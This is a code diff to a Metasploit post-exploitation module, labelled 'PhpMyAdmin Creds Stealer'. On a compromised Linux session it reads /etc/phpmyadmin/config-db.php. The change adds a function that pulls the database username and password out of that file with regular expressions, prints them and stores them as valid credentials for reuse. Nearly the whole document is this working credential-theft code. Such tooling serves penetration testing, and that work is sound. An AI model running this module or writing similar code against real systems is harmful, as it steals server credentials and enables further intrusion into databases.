@@ -25,32 +25,47 @@ class MetasploitModule < Msf::Post
     ))
    end
 
-  def run
+  def parse_creds(contents)
+    db_user = contents.scan(/\$dbuser\s*=\s*['"](.*)['"];/).flatten.first
+    db_pass = contents.scan(/\$dbpass\s*=\s*['"](.*)['"];/).flatten.first
 
+    unless db_user && db_pass
+      print_error("Couldn't find PhpMyAdmin credentials")
+      return
+    end
+
+    print_good("User: #{db_user}")
+    print_good("Password: #{db_pass}")
+
+    print_status("Storing credentials...")
+    store_valid_credential(user: db_user, private: db_pass)
+  end
+
+  def run
     print_line("\nPhpMyAdmin Creds Stealer!\n")
-    cred_dump = ""
 
     if session.platform.include?("windows")
       print_error("This module is not compatible with windows")
       return
     end
 
-    conf_path= "/etc/phpmyadmin/config-db.php"
+    conf_path = "/etc/phpmyadmin/config-db.php"
     unless file_exist?(conf_path)
       print_error("#{conf_path} doesn't exist on target")
       return
     end
 
     print_good('PhpMyAdmin config found!')
-    print_good("Extracting Creds")
     res = read_file(conf_path)
     unless res
       print_error("You may not have permissions to read the file.")
       return
     end
 
-    cred_dump << res
-    p = store_loot('phpmyadmin_conf', 'text/plain', session, cred_dump, 'phpmyadmin_conf.txt', 'phpmyadmin_conf')
-    print_good("Credentials saved in #{p}")
+    print_good("Extracting creds")
+    parse_creds(res)
+
+    p = store_loot('phpmyadmin_conf', 'text/plain', session, res, 'phpmyadmin_conf.txt', 'phpmyadmin_conf')
+    print_good("Config file located at #{p}")
   end
 end
